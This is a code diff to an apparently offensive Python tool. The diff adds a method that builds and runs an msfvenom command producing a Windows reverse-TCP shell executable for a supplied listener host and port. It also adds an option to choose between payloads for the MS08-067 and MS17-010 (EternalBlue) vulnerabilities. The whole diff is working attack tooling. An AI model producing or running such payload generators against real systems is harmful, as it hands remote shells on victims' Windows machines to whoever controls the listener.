@@ -39,15 +39,37 @@ class RevShellPayload():
             print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
         except Exception as e:
             print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
+    
+    # generate payload eternal blue
+    def generate_blue(self):
+        print (LogColors.BLUE + "generate eternal blue payload..." + LogColors.ENDC)
+        msfv = "msfvenom -p windows/shell_reverse_tcp"
+        msfv += " LHOST=" + self.host
+        msfv += " LPORT=" + self.port
+        msfv += " EXITFUNC=thread"
+        msfv += " -f exe -a x86 --platform windows"
+        msfv += " -o " + self.fname
+        print (LogColors.YELLOW + msfv + LogColors.ENDC)
+        try:
+            p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
+            p.wait()
+            print (LogColors.GREEN + "eternal blue payload successfully generated :)" + LogColors.ENDC)
+        except Exception as e:
+            print (LogColors.RED + "generate eternal blue payload failed :(" + LogColors.ENDC)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-lh','--lhost', required = True, help = "the host")
     parser.add_argument('-p','--lport', required = True, help = "the port")
-    parser.add_argument('-f','--filename', required = True, help = "filename (revpld.py)")
+    parser.add_argument('-f','--filename', required = True, help = "filename (revpld.py, blue.exe)")
+    parser.add_argument('-v','--vuln', default = "1", help = "1 - MS08-067, 2 - MS17-010 (eternal blue)")
     args = vars(parser.parse_args())
     host, port = args['lhost'], args['lport']
     filename = args['filename']
+    vuln = int(args['vuln'])
     payload = RevShellPayload(host, port, filename)
-    payload.generate()
+    if vuln == 1:
+        payload.generate()
+    elif vuln == 2:
+        payload.generate_blue()
 
